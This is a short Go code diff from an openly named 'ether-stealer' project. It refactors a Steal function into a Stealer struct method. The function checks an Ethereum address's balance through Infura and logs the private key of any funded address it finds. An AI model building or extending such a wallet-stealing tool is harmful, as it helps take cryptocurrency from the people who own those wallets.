@@ -9,18 +9,18 @@ import (
 	"github.com/hexoul/ether-stealer/log"
 )
 
-var (
+type Stealer struct {
 	infuraClient *infura.Infura
-)
+}
 
-func init() {
-	infuraClient = infura.New()
+func New() *Stealer {
+	return &Stealer{infuraClient: infura.New()}
 }
 
 // Steal ether online through infura
-func Steal(addr common.Address, privkey []byte) {
+func (s *Stealer) Steal(addr common.Address, privkey []byte) {
 	addrStr := addr.String()
-	if canStealEther, _ := infuraClient.HasBalance(addrStr); canStealEther {
+	if canStealEther, _ := s.infuraClient.HasBalance(addrStr); canStealEther {
 		log.Infof("STEAL ETHER from %s !!SECRET!! %x", addrStr, privkey)
 		// } else if canCandidate, _ := hasTxCount(addrStr); canCandidate {
 		// 	log.Infof("GOT CANDIDATE %s !!SECRET!! %x", addrStr, privkey)
